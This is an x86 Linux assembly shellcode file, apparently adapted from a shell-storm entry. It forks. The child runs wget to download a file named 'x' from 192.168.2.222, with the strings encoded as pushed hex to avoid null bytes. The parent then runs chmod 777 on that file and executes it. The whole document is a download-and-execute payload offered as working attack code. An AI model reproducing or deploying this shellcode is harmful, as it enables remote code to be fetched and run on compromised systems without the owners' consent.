;http://shell-storm.org/shellcode/files/shellcode-862.php
global _start
section .text
_start:

    ;fork
    mul edx 
    mov al,0x2
    int 0x80
    cmp eax, edx 
    jz child
  
    ;wait(NULL)
    lea eax, [edx]
    mov al,0x7
    int 0x80
        
    ;chmod x
    lea ecx, [edx]    
    mov dword [esp-0x4], ecx
    mov al, 0xf
    mov dword [esp-0x8], 0x78
    mov al, 0xe
    add al, 0x1
    mov ebx, esp
    mov cx, 0x1ff
    int 0x80
    
    ;exec x
    mov dword ebx, [esp-0x12]
    mov dword ebx, [esp-0x8]
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80
    
child:
    ;download 192.168.2.222//x with wget
    push 0xb
    pop eax
    cdq
    push edx
    
    push 0x782f2f32 ;2//x avoid null byte
    push 0x32322e32 ;22.2
    push 0x2e383631 ;.861
    push 0x2e323931 ;.291
    mov ecx,esp
    push edx
    
    push 0x74 ;t
    push 0x6567772f ;egw/
    push 0x6e69622f ;nib/
    push 0x7273752f ;rsu/
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80
